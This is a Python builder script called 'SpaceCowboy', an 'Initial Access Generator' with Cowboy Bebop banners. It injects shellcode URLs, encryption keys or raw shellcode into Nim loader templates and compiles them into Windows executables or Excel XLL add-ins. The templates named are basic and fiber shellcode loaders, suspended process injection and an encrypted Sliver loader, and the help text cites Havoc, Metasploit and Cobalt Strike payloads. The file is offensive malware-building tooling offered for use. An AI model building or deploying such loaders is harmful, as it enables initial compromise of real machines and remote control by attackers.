import os
import argparse
import subprocess
import random
import time
import hashlib

# ANSI escape code for red text
RED = "\033[91m"
RESET = "\033[0m"

# Japanese Katakana for "Space Cowboy" in red
ascii_banner = f"""
{RED}スペースカウボーイ  
       - SPACE COWBOY -{RESET}
"""

# Rotating Quotes in red
quotes = [
    f"{RED}See you, Space Cowboy...{RESET}",
    f"{RED}3... 2... 1... Let's jam!{RESET}"
]

# Select a random quote
selected_quote = random.choice(quotes)

# Display the banner and quote
print(ascii_banner)
print(f" > {selected_quote}")
time.sleep(1)  # Small delay for effect

# Define folders
TEMPLATES_DIR = "templates"
OUTPUT_DIR = "output"

# Ensure required directories exist
os.makedirs(TEMPLATES_DIR, exist_ok=True)
os.makedirs(OUTPUT_DIR, exist_ok=True)

# Mapping user-friendly template names to filenames
template_map = {
    "fibers": "fibers_shellcode_loader.nim",
    "basic": "basic_shellcode_loader.nim",
    "suspended": "suspended_process_injection.nim",
    "encrypted": "encrypted_sliver_loader.nim"  # New encrypted sliver loader template
}

# Stageless loader template
stageless_template = "xll_template.nim"

# Argument parsing for CLI mode
parser = argparse.ArgumentParser(
    description="""
SpaceCowboy.py - Nim-based Initial Access Generator

Staged Loaders:
  - Basic Loader: Generic Shellcode Loader (Supported on WinARM64, and WinX64)
  - Fibers Loader: Fiber Shellcode Loader (Supported on WinARM64, and WinX64)
  - SuspendedPI Loader: Suspended Process Injection (Supported on WinX64)
  - Encrypted Sliver Loader: Requires a URL, an encryption key, and an IV

Stageless Loaders:
  - XLL Template: Requires .bin shellcode (Supports Havoc, MSF, Cobalt [small shellcode only])
    """,
    formatter_class=argparse.RawTextHelpFormatter
)

parser.add_argument("--template", choices=list(template_map.keys()) + ["xll"], required=True, 
                    help="Choose a template: fibers, basic, suspended, encrypted (staged) or xll (stageless)")
parser.add_argument("--output", required=True, help="Output filename for the compiled file")

# Additional arguments only required for staged payloads
parser.add_argument("--url", help="Provide the shellcode URL (required for staged loaders)")
parser.add_argument("--key", help="Encryption key (required for encrypted sliver loader)")
parser.add_argument("--iv", help="Encryption IV (required for encrypted sliver loader)")

# Argument only required for stageless XLL
parser.add_argument("--bin", help="Path to .bin shellcode file (required for XLL stageless loader)")

args = parser.parse_args()

# Ensure MinGW is in the subprocess environment
mingw_path = "/usr/bin"
env = os.environ.copy()
env["PATH"] = mingw_path + ":" + env["PATH"]

# Handle staged templates (including the new encrypted loader)
if args.template != "xll":
    if not args.url:
        print("[ERROR] URL is required for staged payloads.")
        exit(1)
    if args.template == "encrypted":
        if not args.key or not args.iv:
            print("[ERROR] Both encryption key and IV are required for the encrypted sliver loader.")
            exit(1)
    
    selected_template = template_map[args.template]
    template_path = os.path.join(TEMPLATES_DIR, selected_template)
    
    # Read and modify template
    with open(template_path, "r") as file:
        content = file.read()
    
    # Replace the URL placeholder
    content = content.replace("SHELLCODE_URL", args.url)
    
    # If using the encrypted loader, also replace key and iv placeholders
    if args.template == "encrypted":
        content = content.replace("ENCRYPTION_KEY", args.key)
        content = content.replace("ENCRYPTION_IV", args.iv)
    
    # Save modified template
    temp_template_path = os.path.join(TEMPLATES_DIR, f"temp_{selected_template}")
    with open(temp_template_path, "w") as file:
        file.write(content)
    
    # Define output filename
    output_file = os.path.join(OUTPUT_DIR, args.output)
    print(f"[INFO] Compiling {selected_template} with Nim...")
    
    # Run Nim compilation
    try:
        subprocess.run([
            "nim", "c", "-d=mingw", "--app=console", "--cpu=amd64",
            "-o:" + output_file, temp_template_path
        ], check=True, env=env)
        print(f"[SUCCESS] Executable saved to {output_file}")
        
        # Calculate SHA-256 hash and file size
        with open(output_file, "rb") as f:
            file_contents = f.read()
            sha256_hash = hashlib.sha256(file_contents).hexdigest()
            file_size = len(file_contents)
        print(f"[INFO] SHA-256: {sha256_hash}")
        print(f"[INFO] File Size: {file_size} bytes")
    except subprocess.CalledProcessError:
        print("[ERROR] Compilation failed.")
    os.remove(temp_template_path)

# Handle stageless XLL loader
else:
    if not args.bin:
        print("[ERROR] A .bin shellcode file is required for the XLL loader.")
        exit(1)
    
    bin_path = args.bin
    xll_template_path = os.path.join(TEMPLATES_DIR, stageless_template)
    
    # Extract and format shellcode using xxd
    shellcode_hex = subprocess.check_output(["xxd", "-p", "-c", "16", bin_path]).decode().strip()
    
    with open(xll_template_path, "r") as file:
        content = file.read()
    
    content = content.replace("BIN_SHELLCODE", shellcode_hex)
    
    # Save modified template
    temp_xll_template = os.path.join(TEMPLATES_DIR, "temp_xll.nim")
    with open(temp_xll_template, "w") as file:
        file.write(content)
    
    output_xll_file = os.path.join(OUTPUT_DIR, args.output)
    print("[INFO] Compiling XLL loader with Nim...")
    
    try:
        subprocess.run([
            "nim", "c", "-d=mingw", "--cc:/usr/bin/x86_64-w64-mingw32-gcc", "--app=lib", "--cpu=amd64", "--nomain",
            "-o:" + output_xll_file, temp_xll_template
        ], check=True, env=env)
        print(f"[SUCCESS] XLL saved to {output_xll_file}")
        
        # Calculate SHA-256 hash and file size
        with open(output_xll_file, "rb") as f:
            file_contents = f.read()
            sha256_hash = hashlib.sha256(file_contents).hexdigest()
            file_size = len(file_contents)
        print(f"[INFO] SHA-256: {sha256_hash}")
        print(f"[INFO] File Size: {file_size} bytes")
    except subprocess.CalledProcessError:
        print("[ERROR] Compilation failed.")
    os.remove(temp_xll_template)

# Additional ASCII art displayed at the end of the script
final_art = f"""{RED}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⣀⣠⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣒⣤⣄⣦⣶⣾⣿⣿⣿⣿⣿⣿⣿⣥⣀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢤⣭⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⡆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣄⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡤⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠄⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣐⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠐⠲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠺⣿⣿⣿⣿⡗⠀⣹⣿⣿⡿⢿⡿⣿⡿⢻⣧⠀⠉⢻⣿⣹⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⠛⠻⣿⣿⡇⠀⢽⣿⣿⠀⠀⠛⠛⠛⠓⠛⠉⠀⠾⠿⠓⣼⣿⣿⣿⣿⣟⡋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣹⠿⣿⣆⠘⢿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢿⠍⠉⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠛⢿⣧⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⢀⣀⣤⣶⣿⣿⣿⣿⣿⣤⡀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣤⣲⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣫⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠋⢉⡁⠈⠙⢦⡀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⢀⠀⠁⠀⠀⢀⣠⣴⣾⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀
⠀⢸⠁⠐⣿⣿⣿⠆⠸⡷⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠐⠀⠁⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀
⠀⡟⡄⢘⢿⣿⢿⠆⢠⠃⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠷⠁⠀⠂⠀⠀⠀⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⣰⡀⠈⠢⢄⣉⣀⠤⠋⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠓⠀⠀⠀⠀⢠⡆⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀
⢿⣿⣿⣶⣦⣤⣤⣤⣤⣤⣤⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⢱⣹⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀
⠈⣿⢻⣿⣿⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⣾⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀
⠀⠸⡟⣿⣝⡀⣹⣿⣿⣸⣿⣿⣿⣿⣿⣿⡿⠛⠛⢿⣿⣿⣿⣆⡂⠀⠸⣿⡇⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀
⠀⠀⢻⣾⡿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣿⣿⡇⠀⠀⠀⣿⣿⣿⣿⡄⠈⠀⣿⡇⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀
⠀⠀⠀⠛⠿⣷⣶⣶⣶⣾⡿⠋⠁⢸⣿⣿⣧⣴⠖⠚⠛⠋⠉⠹⣏⠀⢸⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠈⠉⠉⡁⠐⠀⠄⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⢀⣼⠀⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢉⠂⠄⡀⠀⠉⠉⠁⠉⠉⠋⠉⠙⣿⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠛⠒
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠄⣁⡂⠀⠀⠀⠀⢀⣠⣴⡿⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
{RESET}"""

print(final_art)
